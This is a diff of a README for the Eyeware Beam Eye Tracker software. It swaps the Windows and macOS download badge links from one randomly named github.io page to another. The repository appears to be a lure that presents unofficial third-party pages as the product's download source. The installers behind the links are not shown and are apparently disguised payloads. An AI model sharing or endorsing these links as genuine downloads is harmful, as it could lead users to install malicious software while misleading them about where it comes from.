@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Eyeware Beam Eye Tracker provides the to
 
 <div align="center">
 
-[![Download Eyeware Beam Eye Tracker](https://img.shields.io/badge/⬇_DOWNLOAD_Eyeware+Beam+Eye+Tracker-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download Eyeware Beam Eye Tracker](https://img.shields.io/badge/⬇_DOWNLOAD_Eyeware+Beam+Eye+Tracker-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Eyeware Beam Eye Tracker provides the to
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 </div>
 
